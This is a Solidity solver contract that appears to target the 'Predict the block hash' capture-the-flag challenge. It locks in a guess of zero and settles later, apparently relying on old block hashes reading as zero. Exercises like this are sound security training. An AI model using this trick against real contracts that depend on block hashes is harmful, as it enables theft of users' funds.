// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
    function isComplete() external view returns (bool);
}

contract PredictTheBlockHashSolver {
    IPredictTheBlockHashChallenge public challenge;

    function PredictTheBlockHashSolver(address _challenge) public payable {
        challenge = IPredictTheBlockHashChallenge(_challenge);
        require(msg.value == 1 ether);

        // Guess 0x0
        challenge.lockInGuess.value(1 ether)(bytes32(0));
    }

    function settleIfReady() public {
        challenge.settle();
    }

    function() public payable {}
}
